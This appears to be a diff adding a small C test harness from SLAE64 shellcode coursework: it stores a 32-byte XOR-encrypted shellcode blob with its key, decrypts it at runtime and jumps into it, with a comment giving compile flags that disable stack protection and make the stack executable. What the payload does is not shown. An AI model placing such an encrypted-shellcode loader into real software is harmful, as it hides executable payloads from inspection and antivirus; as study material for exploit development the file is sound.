@@ -1,0 +1,22 @@
+#include<stdio.h>
+#include<string.h>
+//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+//decrypter shellcode SLAE64-1379
+unsigned char shellcode[] = \
+"\x7a\x5f\xac\x78\x2f\xc3\x45\x2c\x43\x05\x1b\x44\x07\x07\x36\x31\xbc\x97\x33\x77\xed\xba\x12\x04\xaf\x8d\x11\xdd\xa4\x6d\x74\x67";
+unsigned char key[]= \
+"2nl(gxjN*k4ktoey5pc?dXEL&kY^dV{b";
+
+int main()
+{
+   int i=0;
+
+   printf("[+]Decrypting shellcode...");
+
+   for(i=0;i<=strlen(shellcode);i++)
+      shellcode[i]^=key[i];
+
+   printf("ok\n[+]Executing shellcode...ok\n");
+
+   (*(void  (*)()) shellcode)();
+}
